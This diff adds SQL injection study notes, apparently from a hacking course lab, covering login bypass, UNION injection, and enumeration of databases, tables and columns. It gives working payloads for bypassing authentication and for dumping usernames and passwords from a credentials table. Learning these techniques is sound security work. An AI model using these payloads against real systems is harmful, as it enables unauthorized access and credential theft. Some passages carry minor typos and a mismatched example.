@@ -449,5 +449,288 @@ With Boolean Based SQL injection, we can use SQL conditional statements to contr
 
 Finally, in some cases, we may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there. This is known as Out-of-band SQL injection.
 
+# Subverting Query Logic
+Before we start executing entire SQL queries, we will first learn to modify the original query by injecting the OR operator and using SQL comments to subvert the original query's logic. A basic example of this is bypassing web authentication
+
+## Authentication Bypass
+
+Example: Logging in as an Admin user on a website.
+
+Our goal is to log in as the admin user without using the existing password. The current SQL query being executed when logging in legitemately is:
+```
+SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
+```
+
+The page takes in the credentials, then uses the AND operator to select records matching the given username and password. If the MySQL database returns matched records, the credentials are valid, so the PHP code would evaluate the login attempt condition as true. If the condition evaluates to true, the admin record is returned, and our login is validated.
+
+If the password or username is incorrect then the login will fail due to the wrong credentials leading to a false result from the AND operation.
+
+### SQLi Discovery
+
+Before we start subverting the web application's logic and attempting to bypass the authentication, we first have to test whether the login form is vulnerable to SQL injection. To do that, we will try to add one of the below payloads after our username and see if it causes any errors or changes how the page behaves:
+
+|Payload|	URL Encoded|
+|:-:|:-:|
+|'|	%27
+|"|	%22
+|#|	%23
+|;|	%3B
+|)|	%29
+
+Example of injecting a single quote:
+<img width="3602" height="560" alt="image" src="https://github.com/user-attachments/assets/89480c5e-ea37-40ce-869c-5868ed27f882" />
+We see that a SQL error was thrown instead of the Login Failed message. The page threw an error because the resulting query was:
+
+```
+SELECT * FROM logins WHERE username=''' AND password = 'something';
+```
+
+## OR Injection
+We would need the query always to return true, regardless of the username and password entered, to bypass the authentication. To do this, we can abuse the OR operator in our SQL injection.
+
+The MySQL documentation for operation precedence states that the AND operator would be evaluated before the OR operator. This means that if there is at least one TRUE condition in the entire query along with an OR operator, the entire query will evaluate to TRUE since the OR operator returns TRUE if one of its operands is TRUE.
+
+An example of a condition that will always return true is '1'='1'. However, to keep the SQL query working and keep an even number of quotes, instead of using ('1'='1'), we will remove the last quote and use ('1'='1), so the remaining single quote from the original query would be in its place.
+
+So, if we inject the below condition and have an OR operator between it and the original condition, it should always return true:
+```
+admin' or '1'='1
+
+The final query from the OR operator:
+
+SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
+
+```
+
+This means the following:
+
+- If username is admin
+
+OR
+- If 1=1 return true 'which always returns true'
+
+AND
+
+- If password is something
+
+The AND operator will be evaluated first, and it will return false. Then, the OR operator would be evaluated, and if either of the statements is true, it would return true. Since 1=1 always returns true, this query will return true, and it will grant us access.
+
+## Auth Bypass with OR operator
+We were able to log in successfully as admin. However, what if we did not know a valid username? Let us try the same request with a different username this time. To successfully log in once again, we will need an overall true query. This can be achieved by injecting an OR condition into the password field, so it will always return true. Let us try something' or '1'='1 as the password.
+
+<img width="3578" height="523" alt="image" src="https://github.com/user-attachments/assets/e640088c-9536-4f2f-b157-70ee78277464" />
+
+The additional OR condition resulted in a true query overall, as the WHERE clause returns everything in the table, and the user present in the first row is logged in. In this case, as both conditions will return true, we do not have to provide a test username and password and can directly start with the ' injection and log in with just ' or '1' = '1.
+
+# Using Comments
+SQL allows the use of comments as well. Comments are used to document queries or ignore a certain part of the query. We can use two types of line comments with MySQL -- and #, in addition to an in-line comment /**/ (though this is not usually used in SQL injections). The -- can be used as follows:
+
+```
+mysql> SELECT username FROM logins; -- Selects usernames from the logins table 
+
++---------------+
+| username      |
++---------------+
+| admin         |
+| administrator |
+| john          |
+| tom           |
++---------------+
+4 rows in set (0.00 sec)
+```
+
+Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at the end (-- -), to show the use of a space character.
+
+The # symbol can be used as well:
+```
+mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
+
++----+----------+----------+---------------------+
+| id | username | password | date_of_joining     |
++----+----------+----------+---------------------+
+|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
++----+----------+----------+---------------------+
+1 row in set (0.00 sec)
+```
+
+Note: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.
+
+he username is now admin, and the remainder of the query is now ignored as a comment.
+
+Log in with the username admin'-- and anything as the password:
+<img width="2737" height="476" alt="image" src="https://github.com/user-attachments/assets/509be901-301b-4c17-8807-d6c2ad85a980" />
+
+SQL supports the usage of parenthesis if the application needs to check for particular conditions before others. Expressions within the parenthesis take precedence over other operators and are evaluated first.
+<img width="3602" height="577" alt="image" src="https://github.com/user-attachments/assets/65646c79-cd7d-4563-8d00-2c96cf774fff" />
+
+The login failed due to a syntax error, as a closed one did not balance the open parenthesis. To execute the query successfully, we will have to add a closing parenthesis. Let us try using the username admin')-- to close and comment out the rest.
+<img width="3003" height="512" alt="image" src="https://github.com/user-attachments/assets/cb60a0b9-7336-4a19-9ed5-ae35c7319f13" />
+
+The query was successful, and we logged in as admin. The final query as a result of our input is:
+
+```
+SELECT * FROM logins WHERE (username = 'admin')
+```
+
+# Union Clause
+So far, we have only been manipulating the original query to subvert the web application logic and bypass authentication, using the OR operator and comments. However, another type of SQL injection is injecting entire SQL queries executed along with the original query. This section will demonstrate this by using the MySQL Union clause to do SQL Union Injection.
+
+The Union clause is used to combine results from multiple SELECT statements. This means that through a UNION injection, we will be able to SELECT and dump data from all across the DBMS, from multiple tables and databases.
+
+EX:
+```
+mysql> SELECT * FROM ports UNION SELECT * FROM ships;
+```
+
+### Even Columns
+A UNION statement can only operate on SELECT statements with an equal number of columns. For example, if we attempt to UNION two queries that have results with a different number of columns, we get the following error:
+
+```
+mysql> SELECT city FROM ports UNION SELECT * FROM ships;
+
+ERROR 1222 (21000): The used SELECT statements have a different number of columns
+```
+
+The above query results in an error, as the first SELECT returns one column and the second SELECT returns two. Once we have two queries that return the same number of columns, we can use the UNION operator to extract data from other tables and databases.
+
+We can inject a UNION query into the input, such that rows from another table are returned:
+
+```
+SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
+```
+
+### Un-even Columns
+We will find out that the original query will usually not have the same number of columns as the SQL query we want to execute, so we will have to work around that. For example, suppose we only had one column. In that case, we want to SELECT, we can put junk data for the remaining required columns so that the total number of columns we are UNIONing with remains the same as the original query.
+
+The products table has two columns in the above example, so we have to UNION with two columns. If we only wanted to get one column 'e.g. username', we have to do username, 2, such that we have the same number of columns:
+```
+SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
+```
+
+If we had more columns in the table of the original query, we have to add more numbers to create the remaining required columns. For example, if the original query used SELECT on a table with four columns, our UNION injection would be: 
+```
+UNION SELECT username, 2, 3, 4 from passwords-- '
 
 
+mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '
+
++-----------+-----------+-----------+-----------+
+| product_1 | product_2 | product_3 | product_4 |
++-----------+-----------+-----------+-----------+
+|   admin   |    2      |    3      |    4      |
++-----------+-----------+-----------+-----------+
+```
+
+# Union Injection
+## Detect number of columns
+Before going ahead and exploiting Union-based queries, we need to find the number of columns selected by the server. There are two methods of detecting the number of columns:
+
+- Using ORDER BY
+
+The first way of detecting the number of columns is through the ORDER BY function, which we discussed earlier. We have to inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.
+
+For example, we can start with order by 1, sort by the first column, and succeed, as the table must have at least one column. Then we will do order by 2 and then order by 3 until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column we successfully sorted by gives us the total number of columns.
+```
+' order by 1-- -
+```
+
+- Using UNION
+  
+The other method is to attempt a Union injection with a different number of columns until we successfully get the results back. The first method always returns the results until we hit an error, while this method always gives an error until we get a success. We can start by injecting a 3 column UNION query:
+```
+cn' UNION select 1,2,3-- -
+```
+
+## Location of Injection
+It is very common that not every column will be displayed back to the user. For example, the ID field is often used to link different tables together, but the user doesn't need to see it. This tells us that columns 2 and 3, and 4 are printed to place our injection in any of them. We cannot place our injection at the beginning, or its output will not be printed.
+
+This is the benefit of using numbers as our junk data, as it makes it easy to track which columns are printed, so we know at which column to place our query. To test that we can get actual data from the database 'rather than just numbers,' we can use the @@version SQL query as a test and place it in the second column instead of the number 2:
+```
+cn' UNION select 1,@@version,3,4-- -
+```
+
+<img width="1698" height="440" alt="image" src="https://github.com/user-attachments/assets/698e3651-59d6-4bbb-b3a7-e4130caa251a" />
+
+
+PWNBox EX: Use a Union injection to get the result of 'user()'
+
+' UNION SELECT 1,user(), 3, 4-- -
+
+cn' UNION SELECT 1,username,password,4 FROM users-- - # cn to filter existing table using second row data and only get results from users table.
+
+# Database Enumeration
+## MySQL Fingerprinting
+Before enumerating the database, we usually need to identify the type of DBMS we are dealing with. This is because each DBMS has different queries, and knowing what it is will help us know what queries to use.
+
+As an initial guess, if the webserver we see in HTTP responses is Apache or Nginx, it is a good guess that the webserver is running on Linux, so the DBMS is likely MySQL. The same also applies to Microsoft DBMS if the webserver is IIS, so it is likely to be MSSQL. However, this is a far-fetched guess, as many other databases can be used on either operating system or web server.
+
+The following queries and their output will tell us that we are dealing with MySQL:
+
+|Payload	|When to Use	|Expected Output	|Wrong Output|
+|:-:|:-:|:-:|:-:|
+|SELECT @@version|	When we have full query output|	MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1'|	In MSSQL it returns MSSQL version. Error with other DBMS.|
+|SELECT POW(1,1)|	When we only have numeric output|	1|	Error with other DBMS|
+|SELECT SLEEP(5)|	Blind/No Output|	Delays page response for 5 seconds and returns 0.|	Will not delay response with other DBMS|
+
+The output 10.3.22-MariaDB-1ubuntu1 means that we are dealing with a MariaDB DBMS similar to MySQL. Since we have direct query output, we will not have to test the other payloads. Instead, we can test them and see what we get.
+
+## INFORMATION_SCHEMA Database
+o pull data from tables using UNION SELECT, we need to properly form our SELECT queries. To do so, we need the following information:
+
+- List of databases
+- List of tables within each database
+- List of columns within each table
+
+With the above information, we can form our SELECT statement to dump data from any column in any table within any database inside the DBMS. 
+
+The INFORMATION_SCHEMA database contains metadata about the databases and tables present on the server. This database plays a crucial role while exploiting SQL injection vulnerabilities. As this is a different database, we cannot call its tables directly with a SELECT statement. If we only specify a table's name for a SELECT statement, it will look for tables within the same database.
+
+So, to reference a table present in another DB, we can use the dot ‘.’ operator. For example, to SELECT a table users present in a database named my_database, we can use:
+```
+mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+
++--------------------+
+| SCHEMA_NAME        |
++--------------------+
+| mysql              |
+| information_schema |
+| performance_schema |
+| ilfreight          |
+| dev                |
++--------------------+
+6 rows in set (0.01 sec)
+```
+
+### SCHEMATA
+The table SCHEMATA in the INFORMATION_SCHEMA database contains information about all databases on the server. It is used to obtain database names so we can then query them. The SCHEMA_NAME column contains all the database names currently present.
+```
+' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+```
+
+Let us find out which database the web application is running to retrieve ports data from. We can find the current database with the SELECT database() query.
+
+### TABLES
+To find all tables within a database, we can use the TABLES table in the INFORMATION_SCHEMA Database.
+
+The TABLES table contains information about all tables throughout the database. This table contains multiple columns, but we are interested in the TABLE_SCHEMA and TABLE_NAME columns. The TABLE_NAME column stores table names, while the TABLE_SCHEMA column points to the database each table belongs to. This can be done similarly to how we found the database names.
+
+For example, we can use the following payload to find the tables within the dev database:
+```
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+```
+<img width="1710" height="640" alt="image" src="https://github.com/user-attachments/assets/3d917e5f-ae33-4ed9-aacc-93794594b43d" />
+
+### COLUMNS
+To dump the data of the credentials table, we first need to find the column names in the table, which can be found in the COLUMNS table in the INFORMATION_SCHEMA database. The COLUMNS table contains information about all columns present in all the databases. This helps us find the column names to query a table for. The COLUMN_NAME, TABLE_NAME, and TABLE_SCHEMA columns can be used to achieve this.
+```
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+```
+<img width="1698" height="510" alt="image" src="https://github.com/user-attachments/assets/d8b53e16-3b14-42a7-9f72-18f8afe7ad32" />
+
+The table has two columns named username and password. We can use this information and dump data from the table.
+
+### DATA
+Now that we have all the information, we can form our UNION query to dump data of the username and password columns from the credentials table in the dev database. We can place username and password in place of columns 2 and 3:
+```
+cn' UNION select 1, username, password, 4 from dev.credentials-- -
+```
